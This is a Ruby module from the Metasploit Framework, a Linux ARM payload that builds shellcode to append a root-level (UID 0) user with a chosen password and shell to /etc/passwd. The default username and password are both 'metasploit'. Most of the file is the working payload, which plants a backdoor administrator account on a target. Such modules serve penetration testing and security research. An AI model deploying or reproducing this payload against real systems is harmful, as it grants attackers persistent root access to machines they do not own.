##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'

###
#
# AddUser
# -------
#
# Adds a UID 0 user to /etc/passwd.
#
###
module Metasploit3

  include Msf::Payload::Single
  include Msf::Payload::Linux

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Add User',
      'Description'   => 'Create a new user with UID 0',
      'Author'        => [ 'Jonathan Salwan' ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_ARMLE,
      'Privileged'    => true))

    # Register adduser options
    register_options(
      [
        OptString.new('USER',  [ true,  "The username to create",     "metasploit" ]),
        OptString.new('PASS',  [ true,  "The password for this user", "metasploit" ]),
        OptString.new('SHELL', [ false, "The shell for this user",    "/bin/sh"    ]),
      ], self.class)
  end

  #
  # Dynamically builds the adduser payload based on the user's options.
  #
  def generate_stage
    user    = datastore['USER']  || 'metasploit'
    pass    = datastore['PASS']  || 'metasploit'
    shell   = datastore['SHELL'] || '/bin/sh'
    str     = "#{user}:#{pass.crypt('Az')}:0:0::/:#{shell}\n"
    strl1   = [ (str.length)+52 ].pack('C*')
    strl2   = [ str.length ].pack('C*')
    pwdir   = "/etc/passwd"
    payload =
      "\x05\x50\x45\xe0\x01\x50\x8f\xe2\x15\xff\x2f\xe1" +
      "\x78\x46"+ strl1 + "\x30\xff\x21\xff\x31\xff\x31" +
      "\xff\x31\x45\x31\xdc\x22\xc8\x32\x05\x27\x01\xdf" +
      "\x80\x46\x41\x46\x08\x1c\x79\x46\x18\x31\xc0\x46" +
      strl2 + "\x22\x04\x27\x01\xdf\x41\x46\x08\x1c\x06" +
      "\x27\x01\xdf\x1a\x49\x08\x1c\x01\x27\x01\xdf" +
      str + pwdir

  end

end
